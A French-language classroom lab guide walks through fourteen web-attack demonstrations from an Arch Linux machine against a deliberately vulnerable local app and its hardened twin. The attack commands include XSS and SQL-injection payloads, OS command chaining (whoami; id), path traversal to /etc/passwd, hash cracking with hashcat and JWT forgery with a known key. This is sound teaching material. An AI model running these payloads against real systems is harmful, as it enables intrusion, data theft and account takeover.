# 🏹 Guide d'Audit et Démonstration pour l'Attaquant sous Arch Linux

Ce guide est spécialement conçu pour la **machine de test sous Arch Linux** (ou BlackArch). Il fournit l'ensemble des instructions d'installation avec `pacman`, la configuration réseau, et les commandes pas à pas pour réaliser la démonstration des **14 missions du TP** devant le professeur.

---

## 🌐 1. Topologie Réseau de la Démonstration

```text
  [ MACHINE 1 : SERVEUR ]                          [ MACHINE 2 : ATTAQUANT / AUDITEUR ]
  OS : Windows / Ubuntu                           OS : Arch Linux
  IP : 192.168.0.225 (Exemple - vérifiez la vôtre) IP : 192.168.0.X (Même réseau Wi-Fi / LAN)
  - Port 8080 : App Vulnérable (HTTP)              - pacman / yay / outils de sécurité
  - Port 8081 : App Sécurisée (HTTPS)             - Navigateur Web (Chromium / Firefox)
```

---

## 📦 2. Préparation de la Machine Arch Linux

### 2.1. Installer les outils requis via `pacman`
Sur Arch Linux, ouvrez un terminal :
```bash
sudo pacman -Syu --noconfirm
sudo pacman -S --noconfirm nikto sqlmap hashcat openbsd-netcat curl openssl python python-pip python-requests git testssl.sh
```

### 2.2. Récupérer les outils complémentaires GitHub (si nécessaire)
Dans un dossier de travail sur Arch Linux (ex: `~/audit-lab`) :
```bash
mkdir -p ~/audit-lab && cd ~/audit-lab

# XSStrike (XSS Fuzzer)
git clone https://github.com/s0md3v/XSStrike.git
pip install -r XSStrike/requirements.txt --break-system-packages

# Commix (Command Injection)
sudo pacman -S --noconfirm commix || git clone https://github.com/commixproject/commix.git

# jwt_tool (Audit JWT)
git clone https://github.com/ticarpi/jwt_tool.git
pip install -r jwt_tool/requirements.txt --break-system-packages
```

### 2.3. Configurer `/etc/hosts` sur Arch Linux
Pour tester avec des noms de domaine comme demandé :
```bash
sudo nano /etc/hosts
```
Ajoutez l'adresse IP de la machine serveur (ex: `192.168.0.225`) :
```text
192.168.0.225   vulnerable.local secure.local
```
*(Remplacez `192.168.0.225` par l'IP réelle affichée sur le terminal du serveur).*

Testez la connectivité :
```bash
ping -c 2 vulnerable.local
```

---

## 🎯 3. Déroulement de la Démonstration Mission par Mission

Toutes ces commandes sont à exécuter depuis le terminal **Arch Linux**.

---

### 🛡️ Mission 1.1 : Audit Global des En-têtes (Nikto & curl)
**Objectif :** Démontrer l'absence des 8 en-têtes HTTP de sécurité sur l'app vulnérable, puis leur présence sur l'app sécurisée.

```bash
# 1. Audit sur la version vulnérable :
nikto -h http://vulnerable.local:8080
# Ou inspection rapide des en-têtes :
curl -I http://vulnerable.local:8080/
# Constat : Absence totale de CSP, X-Frame-Options, HSTS, X-Content-Type-Options.

# 2. Audit sur la version sécurisée :
curl -k -I https://secure.local:8081/
# Constat : Présence de Strict-Transport-Security, X-Frame-Options: DENY,
# Content-Security-Policy, Referrer-Policy, COOP, COEP, Permissions-Policy.
```

---

### 🛡️ Mission 1.2 : Attaque sur le Transport & Downgrade (testssl.sh / HSTS)
**Objectif :** Prouver la vulnérabilité au SSL Stripping sur le port 8080 et le forçage HTTPS avec HSTS sur le port 8081.

```bash
# 1. Vérification transport en clair vulnérable :
curl -I http://vulnerable.local:8080/

# 2. Vérification durcissement TLS et HSTS :
testssl.sh https://secure.local:8081/
# Ou avec openssl :
openssl s_client -connect secure.local:8081 -tls1_2
```
*Résultat : Le serveur sécurisé applique `Strict-Transport-Security: max-age=31536000; includeSubDomains`.*

---

### 🛡️ Mission 1.3 : Contournement des Restrictions de Scripts (XSStrike / XSS)
**Objectif :** Exploiter l'absence de CSP et d'échappement sur `/search?q=test`.

```bash
# 1. Test automatisé avec XSStrike contre l'application vulnérable :
python ~/audit-lab/XSStrike/xsstrike.py -u "http://vulnerable.local:8080/search?q=test"

# Vérification manuelle curl (le code HTML est renvoyé brut sans encodage) :
curl -s "http://vulnerable.local:8080/search?q=%3Cscript%3Ealert('XSS')%3C/script%3E" | grep "<script>"

# 2. Test contre l'application sécurisée :
curl -k -s "https://secure.local:8081/search?q=%3Cscript%3Ealert('XSS')%3C/script%3E" | grep "script"
# Résultat : Caractères échappés en &lt;script&gt; et exécution bloquée par la CSP ('self').
```

---

### 🛡️ Mission 1.4 : Clickjacking (UI Redressing)
Sur la machine Arch Linux :
1. Lancez un serveur web local pour héberger le PoC d'encadrement :
```bash
# Créez le fichier de test attack_clickjack.html :
cat << 'EOF' > ~/audit-lab/clickjack.html
<!DOCTYPE html>
<html>
<head><title>Test Clickjacking</title></head>
<body style="text-align:center;">
    <h2>Démonstration Clickjacking (Mission 1.4)</h2>
    <p>Tentative d'intégration dans une iframe transparente :</p>
    <iframe src="http://vulnerable.local:8080/" width="800" height="500"></iframe>
</body>
</html>
EOF

# Ouvrir dans votre navigateur Chromium/Firefox :
firefox ~/audit-lab/clickjack.html
```
2. **Sur `http://vulnerable.local:8080/` :** L'application se charge dans l'iframe.
3. Remplacez l'URL de l'iframe par `https://secure.local:8081/` :  
   **Résultat :** Le navigateur affiche un blocage direct (`X-Frame-Options: DENY` et `frame-ancestors 'none'`).

---

### 🛡️ Mission 1.5 : Attaque par Fichier Polyglotte (MIME-Sniffing)
**Objectif :** Vérifier l'en-tête `X-Content-Type-Options: nosniff`.

```bash
# Absence sur l'application vulnérable :
curl -I http://vulnerable.local:8080/static/

# Présence sur l'application sécurisée :
curl -k -I https://secure.local:8081/ | grep -i "x-content-type-options"
# Résultat : X-Content-Type-Options: nosniff
```

---

### 🛡️ Mission 1.6 : Interception de Jetons Secrets dans l'URL (Referrer-Policy)
1. Sur Arch Linux, lancez un écouteur Netcat sur le port 9999 :
```bash
nc -lvnp 9999
```
2. Depuis le navigateur de la victime, visitez :  
   `http://vulnerable.local:8080/referrer-leak?token=SECRET_ADMIN_TOKEN_999`
3. Cliquez sur le lien sortant : Dans votre terminal Netcat, vous observez la réception de :  
   `Referer: http://vulnerable.local:8080/referrer-leak?token=SECRET_ADMIN_TOKEN_999`
4. Sur l'application sécurisée (`https://secure.local:8081/...`), seule l'origine est envoyée (`https://secure.local:8081/`), le token est protégé.

---

### 🛡️ Mission 1.7 : Isolation Inter-Onglets (COOP & COEP)
Vérifiez la présence des en-têtes d'isolation sur l'application sécurisée :
```bash
curl -k -I https://secure.local:8081/ | grep -E -i "cross-origin-opener-policy|cross-origin-embedder-policy"
# Résultat attendu :
# Cross-Origin-Opener-Policy: same-origin
# Cross-Origin-Embedder-Policy: require-corp
```

---

### 🛡️ Mission 1.8 : Restrictions Matériel (Permissions-Policy)
```bash
curl -k -I https://secure.local:8081/ | grep -i "permissions-policy"
# Résultat attendu : Permissions-Policy: camera=(), microphone=(), geolocation=()
```

---

### 🛡️ Mission 1.9 : Exploitation d'une Injection SQL (SQLMap)
**Objectif :** Extraire les comptes et rôles de la base de données.

```bash
# 1. Test direct par injection d'une condition toujours vraie :
curl -s "http://vulnerable.local:8080/api/search?q=admin'%20OR%20'1'='1"
# Résultat : TOUS les utilisateurs enregistrés sont extraits !

# Avec SQLMap :
sqlmap -u "http://vulnerable.local:8080/api/search?q=admin" --batch --dbs

# 2. Test contre l'application sécurisée :
curl -k -s "https://secure.local:8081/api/search?q=admin'%20OR%20'1'='1"
# Résultat attendu : [] (0 utilisateur retourné, la chaîne est paramétrée sans injection).
```

---

### 🛡️ Mission 1.10 : Injection de Commandes OS (Commix)
**Objectif :** Exécuter une commande système arbitraire sur le serveur.

```bash
# 1. Test direct de chaînage de commande :
curl -s -X POST http://vulnerable.local:8080/diagnostics -d "target=127.0.0.1; whoami; id"
# Résultat : Le résultat de 'whoami' s'affiche dans la sortie du serveur !

# Avec Commix :
commix -u "http://vulnerable.local:8080/diagnostics" --data="target=127.0.0.1"

# 2. Test contre l'application sécurisée :
curl -k -s -X POST https://secure.local:8081/diagnostics -d "target=127.0.0.1; whoami"
# Résultat : "Adresse refusée. Seules les IP privées..." (Rejet ipaddress + shell=False).
```

---

### 🛡️ Mission 1.11 : XSS Stocké & Vol de Session
1. Connectez-vous sur `http://vulnerable.local:8080/login` (`admin` / `Admin@2025!`).
2. Postez une annonce ou un commentaire avec : `<script>alert(document.cookie)</script>`.
3. Sur l'application vulnérable : Le script s'exécute car `| safe` désactive l'échappement et le cookie n'est pas `HttpOnly`.
4. Sur l'application sécurisée : Échappement HTML actif + cookies avec `HttpOnly; Secure; SameSite=Lax`.

---

### 🛡️ Mission 1.12 : Remontée de Répertoire / Path Traversal (DotDotPwn)
```bash
# 1. Sur l'application vulnérable :
curl -s "http://vulnerable.local:8080/documents/download/../../../../etc/passwd"
# (Ou sous Windows : ../../../../Windows/win.ini)
# Résultat : Le fichier système confidentiel est retourné !

# 2. Sur l'application sécurisée :
curl -k -s "https://secure.local:8081/documents/download/../../../../etc/passwd"
# Résultat : 404 / 403 (safe_join + téléchargement par identifiant numérique).
```

---

### 🛡️ Mission 1.13 : Cassage de Mots de Passe Bruts (Hashcat)
1. À partir du hash SHA-256 non salé de l'administrateur exfiltré à la Mission 1.9 :
```bash
# Sauvegarder le hash SHA-256 dans un fichier :
echo "188209e1a05f534cbbabe055a14ea137452d3a3c20c02936a6cf497c6cfa5797" > ~/audit-lab/admin_hash.txt

# Lancer l'attaque par dictionnaire avec Hashcat (mode 1400 = SHA-256 brut sans sel) :
hashcat -m 1400 -a 0 ~/audit-lab/admin_hash.txt /usr/share/wordlists/rockyou.txt
```
*Constat : Le mot de passe est cassé instantanément. Sur l'app sécurisée, **Argon2id** empêche toute attaque par dictionnaire accélérée.*

---

### 🛡️ Mission 1.14 : Falsification de Session JWT (jwt_tool)
```bash
# 1. Obtenir un jeton étudiant valide :
TOKEN=$(curl -s -X POST http://vulnerable.local:8080/api/token \
  -H "Content-Type: application/json" \
  -d '{"username": "student1", "password": "Student@2025!1"}' | grep -o '"token":"[^"]*' | cut -d'"' -f4)

# 2. Vérifier l'identité actuelle (student) :
curl -s -H "Authorization: Bearer $TOKEN" http://vulnerable.local:8080/api/me

# 3. Forger un jeton avec le rôle admin grâce à la clé connue ("insecure-jwt-secret-key") :
python ~/audit-lab/jwt_tool/jwt_tool.py $TOKEN -T -S hs256 -p "insecure-jwt-secret-key"

# Sur l'application sécurisée, la clé secrète de 256 bits et le contrôle en base rejettent toute tentative.
```

---

## ⚡ 4. Audit Automatisé Global en 1 Seule Commande

Pour générer le tableau récapitulatif complet devant le professeur, copiez le script `laboratory/audit_security.py` sur la machine Arch Linux et lancez :

```bash
python3 audit_security.py --host-vuln http://vulnerable.local:8080 --host-sec https://secure.local:8081
```

Ce script teste toutes les routes et affiche un tableau comparatif complet validant chaque contre-mesure.
